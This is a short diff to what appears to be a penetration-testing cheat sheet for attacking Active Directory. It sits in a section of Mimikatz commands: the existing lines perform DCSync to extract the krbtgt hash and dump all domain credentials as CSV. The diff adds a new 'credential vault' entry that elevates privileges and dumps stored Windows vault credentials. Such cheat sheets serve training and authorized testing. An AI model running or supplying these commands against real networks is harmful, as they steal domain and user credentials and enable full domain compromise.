@@ -2764,3 +2764,7 @@ tasklist /v | findstr /I svcadmin
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /all /csv"'
 ```
+##### MIMIKATZ - CREDENTIAL VAULT
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
+```
